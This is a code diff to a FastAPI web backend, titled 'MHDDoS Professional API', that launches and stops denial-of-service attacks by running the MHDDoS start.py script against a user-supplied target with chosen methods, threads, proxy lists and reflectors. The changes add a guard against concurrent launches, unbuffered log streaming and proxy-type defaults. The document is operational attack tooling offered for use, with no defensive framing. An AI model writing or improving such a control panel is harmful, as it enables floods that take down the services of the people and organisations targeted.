@@ -14,6 +14,7 @@ app = FastAPI(title="MHDDoS Professional API")
 
 # --- Global State ---
 attack_process = None
+is_starting_attack = False
 connected_websockets = []
 ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
 
@@ -39,7 +40,7 @@ class AttackParams(BaseModel):
     rpc: str = "100"
     reflector: str = ""
 
-async def broadcast_log(message: str):
+async def broadcast_log(message: str) -> None:
     """Sends a log message to all connected WebSockets"""
     for client in connected_websockets:
         try:
@@ -47,23 +48,22 @@ async def broadcast_log(message: str):
         except Exception:
             pass
 
-async def run_attack_subprocess(params: AttackParams):
-    global attack_process
+async def run_attack_subprocess(params: AttackParams) -> None:
+    global attack_process, is_starting_attack
     
     # Pre-process Proxy List argument
     proxy_list_arg = params.proxy_list
+    proxy_type_code = PROXY_TYPES.get(params.proxy_type, "5") # SOCKS5 as fallback
+    
     if params.proxy_type == "All Proxy":
-        proxy_type_code = "0"
-        proxy_list_arg = "proxies/all.txt" # Give it something valid even if it fails downloading later
-    elif params.proxy_type == "RANDOM":
-        proxy_type_code = "6"
+        if not proxy_list_arg:
+            proxy_list_arg = "all.txt" # Default local file 
     
     if proxy_list_arg.startswith("http"):
         # If the user passed a URL, we pass that URL directly as the proxy list argument to start.py
-        # start.py handles downloading it under the hood (though there might be path issues in start.py itself, see error log)
         pass 
         
-    command = [sys.executable, "start.py", params.method, params.target]
+    command = [sys.executable, "-u", "start.py", params.method, params.target]
     
     if params.method in LAYER7:
         command.extend([proxy_type_code, params.threads, proxy_list_arg, params.rpc, params.duration])
@@ -84,6 +84,7 @@ async def run_attack_subprocess(params: AttackParams):
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.STDOUT
         )
+        is_starting_attack = False
         
         while True:
             line = await attack_process.stdout.readline()
@@ -102,21 +103,23 @@ async def run_attack_subprocess(params: AttackParams):
         await broadcast_log("[*] Attack process terminated gracefully.")
     except Exception as e:
         await broadcast_log(f"[!] Critical Error starting process: {e}")
+        is_starting_attack = False
     finally:
         attack_process = None
 
 @app.post("/api/attack/start")
-async def start_attack(params: AttackParams):
-    global attack_process
-    if attack_process is not None:
+async def start_attack(params: AttackParams) -> dict:
+    global attack_process, is_starting_attack
+    if attack_process is not None or is_starting_attack:
         return {"status": "error", "message": "An attack is already running."}
     
+    is_starting_attack = True
     # Run the subprocess task in the background
     asyncio.create_task(run_attack_subprocess(params))
     return {"status": "success", "message": "Attack initiated."}
 
 @app.post("/api/attack/stop")
-async def stop_attack():
+async def stop_attack() -> dict:
     global attack_process
     if attack_process is None:
         return {"status": "error", "message": "No attack is currently running."}
@@ -124,15 +127,13 @@ async def stop_attack():
     await broadcast_log("[!] Attempting to terminate the attack...")
     try:
         attack_process.terminate()
-        attack_process = None
-        await broadcast_log("[*] Process Terminated.")
         return {"status": "success", "message": "Attack stopped."}
     except Exception as e:
         await broadcast_log(f"[!] Error attempting to stop process: {e}")
         return {"status": "error", "message": str(e)}
 
 @app.get("/api/select_file")
-async def select_file_dialog():
+async def select_file_dialog() -> dict:
     # Run tkinter in a separate thread to avoid blocking the async event loop
     def _open_dialog():
         root = tk.Tk()
@@ -147,7 +148,7 @@ async def select_file_dialog():
     return {"path": path or ""}
 
 @app.websocket("/ws/logs")
-async def websocket_endpoint(websocket: WebSocket):
+async def websocket_endpoint(websocket: WebSocket) -> None:
     await websocket.accept()
     connected_websockets.append(websocket)
     try:
